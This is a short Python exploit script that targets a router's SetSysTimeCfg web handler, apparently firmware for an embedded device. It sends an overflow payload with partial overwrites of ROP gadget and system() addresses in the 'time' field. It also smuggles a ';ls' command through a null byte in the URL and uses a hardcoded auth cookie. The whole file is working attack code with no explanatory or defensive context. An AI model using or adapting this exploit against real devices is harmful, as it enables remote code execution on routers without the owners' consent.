from pwn import *
import requests

class TrickUrlSession(requests.Session):
    def setUrl(self, url):
        self._trickUrl = url
    def send(self, request, **kwargs):
        if self._trickUrl:
            request.url = self._trickUrl
        return requests.Session.send(self, request, **kwargs)


url = 'http://192.168.99.1/goform/SetSysTimeCfg%00;ls'

headers={
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'password=bc3f33014002bdb80953a0662b3ada23giimji'
}

pop_r0 = 0x000d5cac
system = 0xeb18
bss = 0x11c0f0
mov_r0_r5 = 0xD1998
add_r0_r3_r0 = 0x000cb054
pop_r3 = 0xD1CEC

payload1 = 'A'
payload2 = 'B'
payload3 = 'C'
payload4 = 'D'*712+p32(system)[:2]
payload5 = 'E'*(0x29c)+p32(mov_r0_r5)[:3]
data={
    'timeType':"manual",
    'time':'%s-%s-%s %s:%s:10'%(payload1,payload2,payload3,payload4,payload5)
}
session = TrickUrlSession()
session.setUrl(url)
# print session.post(url, data=data, headers=headers, proxies={'http':'http://127.0.0.1:8080'}).content
print session.post(url, data=data, headers=headers).content

